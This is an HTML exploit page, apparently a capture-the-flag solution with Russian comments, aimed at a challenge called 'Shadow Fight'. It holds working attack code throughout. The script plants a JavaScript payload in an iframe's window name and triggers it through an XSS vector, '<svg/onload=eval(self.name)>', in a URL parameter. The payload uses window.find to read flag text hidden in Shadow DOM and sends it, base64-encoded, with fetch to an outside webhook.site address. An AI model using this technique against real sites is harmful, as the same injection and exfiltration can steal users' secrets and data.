<!DOCTYPE html>
<html>
<head>
    <title>Shadow Fight Exploit</title>
</head>
<body>
    <h1>Exploit loading...</h1>
    <p>Если видите этот текст, значит эксплойт работает. Смотрите вебхук.</p>
    
    <script>
        // 1. Код, который выполнится внутри задачи
        // Мы используем backticks (`) для многострочного текста
        var payload = `
            setTimeout(function() {
                try {
                    // Пытаемся найти текст флага
                    // window.find заставляет браузер выделить скрытый текст в Shadow DOM
                    window.find('p_ctf');
                    
                    var sel = window.getSelection();
                    if (sel && sel.anchorNode) {
                        var flag = sel.anchorNode.textContent;
                        // Отправляем флаг (кодируем в base64, чтобы не ломать URL)
                        fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44flag=' + btoa(flag));
                    } else {
                        // Если не нашли, отправляем ошибку
                        fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=NotFound');
                    }
                } catch (e) {
                    // Если произошла ошибка JS
                    fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=' + btoa(e.toString()));
                }
            }, 2000); // Ждем 2 секунды полной загрузки
        `;

        // 2. Создаем iframe
        var iframe = document.createElement('iframe');
        
        // 3. ПРИСВАИВАЕМ ИМЯ ОКНА IFRAME
        // Именно отсюда eval(self.name) возьмет наш код
        iframe.name = payload;
        
        // 4. Ссылка на задачу
        // Используем self.name, чтобы обратиться к имени текущего окна (iframe)
        iframe.src = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(self.name)%3E&avatar=https://picsum.photos/100";
        
        // Сделаем iframe большим, чтобы window.find точно сработал (браузеры не ищут в скрытых фреймах)
        iframe.style.width = "100%";
        iframe.style.height = "800px";
        iframe.style.border = "1px solid red";
        
        document.body.appendChild(iframe);
    </script>
</body>
</html>
